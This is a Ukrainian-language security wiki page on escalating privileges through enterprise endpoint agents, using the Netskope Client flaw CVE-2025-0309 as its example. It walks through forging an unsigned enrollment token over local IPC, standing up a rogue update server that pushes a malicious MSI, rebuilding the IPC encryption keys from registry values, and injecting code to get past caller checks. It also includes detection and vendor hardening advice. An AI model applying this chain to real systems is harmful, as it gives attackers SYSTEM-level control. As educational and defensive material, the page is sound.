# Зловживання корпоративними автооновлювачами та привілейованим IPC (наприклад, Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас Windows local privilege escalation ланцюжків, що зустрічаються в enterprise endpoint agents та updaters, які надають простий у використанні IPC інтерфейс і привілейований потік оновлення. Репрезентативним прикладом є Netskope Client for Windows < R129 (CVE-2025-0309), де користувач з низькими привілеями може примусити реєстрацію на сервері, контрольованому нападником, і потім доставити шкідливий MSI, який встановлює служба SYSTEM.

Ключові ідеї, які можна повторно використати проти схожих продуктів:
- Зловживати localhost IPC привілейованої служби, щоб примусити повторну реєстрацію або переналаштування на сервер нападника.
- Реалізувати update endpoints постачальника, доставити підроблений Trusted Root CA і вказати апдейтеру зловмисний «підписаний» пакет.
- Уникати слабких перевірок підписувача (CN allow‑lists), опціональних digest flags та розслаблених властивостей MSI.
- Якщо IPC «шифрується», виводити ключ/IV із загальнодоступних ідентифікаторів машини, збережених у registry.
- Якщо служба обмежує викликачів за image path/process name, інжектити в allow‑listed процес або створити процес у suspended стані і завантажити ваш DLL через мінімальну правку thread‑context.

---
## 1) Примусова реєстрація на сервері нападника через localhost IPC

Багато агентів постачають user‑mode UI процес, який спілкується зі службою SYSTEM по localhost TCP з використанням JSON.

Спостерігалось у Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Схема експлуатації:
1) Сформуйте JWT enrollment token, у якому claims контролюють backend host (наприклад, AddonUrl). Використайте alg=None, щоб підпис не був потрібен.
2) Надішліть IPC повідомлення, що викликає provisioning команду з вашим JWT і tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатися до вашого зловмисного сервера для реєстрації/конфігурації, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка виклику ґрунтується на шляху/імені, ініціюйте запит із виконуваного файлу постачальника, включеного до білого списку (див. §4).

---
## 2) Підміна каналу оновлень для запуску коду як SYSTEM

Коли клієнт починає спілкуватися з вашим сервером, реалізуйте очікувані кінцеві точки і спрямовуйте його на шкідливий MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM CA сертифікат. Сервіс встановлює його в сховище Trusted Root локальної машини.
3) /v2/checkupdate → Надає метадані, що вказують на шкідливий MSI і підроблену версію.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: сервіс може перевіряти лише чи Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваш підроблений CA може видати leaf з цим CN і підписати MSI.
- CERT_DIGEST property: додайте нешкідливу MSI властивість з ім'ям CERT_DIGEST. Під час встановлення не застосовується.
- Optional digest enforcement: конфігураційний прапорець (наприклад, check_msi_digest=false) вимикає додаткову криптографічну перевірку.

Result: служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
виконуючи довільний код як NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope вкладала IPC JSON у поле encryptData, яке виглядає як Base64. Реверс-інжиніринг показав AES з key/IV, похідними від значень реєстру, доступних для читання будь-яким користувачем:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Атакувальники можуть відтворити шифрування і відправляти дійсні зашифровані команди від звичайного користувача. Загальна порада: якщо агент раптово «шифрує» свій IPC, шукайте device IDs, product GUIDs, install IDs під HKLM як матеріал для ключів.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Деякі служби намагаються автентифікувати пір, визначаючи PID TCP-з'єднання й порівнюючи шлях/ім'я образу з allow‑list`ом бінарників вендора, що розташовані в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection у allow‑listed процес (наприклад, nsdiag.exe) та проксування IPC зсередини нього.
- Запустіть allow‑listed бінарник у suspended стані та завантажте ваш proxy DLL без використання CreateRemoteThread (див. §5), щоб задовольнити правила драйвера щодо запобігання підмінам.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Продукти часто постачають драйвер minifilter/OB callbacks (наприклад, Stadrv), щоб видаляти небезпечні права з дескрипторів до захищених процесів:
- Process: видаляє PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: обмежує до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний юзер‑мод лоадер, що враховує ці обмеження:
1) CreateProcess вендорського бінарника з CREATE_SUSPENDED.
2) Отримайте дескриптори, які вам ще дозволено мати: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для процесу, і дескриптор потоку з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або просто THREAD_RESUME, якщо ви патчите код у відомому RIP).
3) Перезапишіть ntdll!NtContinue (або інший ранній, гарантовано підключений thunk) невеликим стубом, який викликає LoadLibraryW для шляху до вашого DLL, а потім повертається.
4) ResumeThread, щоб ініціювати виконання вашого стуба всередині процесу, завантаживши ваш DLL.

Оскільки ви ніколи не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже захищеного процесу (ви його створили), політика драйвера задовольняється.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) автоматизує rogue CA, підписання шкідливого MSI, і слугує потрібні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope — кастомний IPC клієнт, який створює довільні (опціонально AES‑зашифровані) IPC-повідомлення і включає інжекцію в suspended‑процес, щоб походження було від allow‑listed бінарника.

---
## 7) Detection opportunities (blue team)
- Моніторьте додавання до Local Machine Trusted Root. Sysmon + registry‑mod eventing (див. керівництво SpecterOps) працює добре.
- Позначайте виконання MSI, ініційовані службою агента з таких шляхів, як C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Перегляньте логи агента на предмет несподіваних enrollment hosts/tenants, напр.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – звертайте увагу на addonUrl / tenant аномалії та provisioning msg 148.
- Сповіщайте про localhost IPC клієнтів, які не є очікуваними підписаними бінарниками, або походять з незвичних дерев дочірніх процесів.

---
## Hardening tips for vendors
- Прив’язуйте enrollment/update хости до суворого allow‑list'у; відкидайте непро���і домени в clientcode.
- Аутентифікуйте IPC-пірів за допомогою примітивів ОС (ALPC security, named‑pipe SIDs) замість перевірок шляху/імені образу.
- Не зберігайте секретні матеріали у загальнодоступному для читання HKLM; якщо IPC має бути зашифрованим, виводьте ключі з захищених секретів або погоджуйте їх по автентифікованих каналах.
- Розглядайте updater як вектор ланцюга постачання: вимагайте повний ланцюжок до довіреного CA, яким ви керуєте, верифікуйте підписи пакетів проти pinned keys, і відмовляйтеся від роботи (fail closed), якщо валідація вимкнена в конфігурації.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
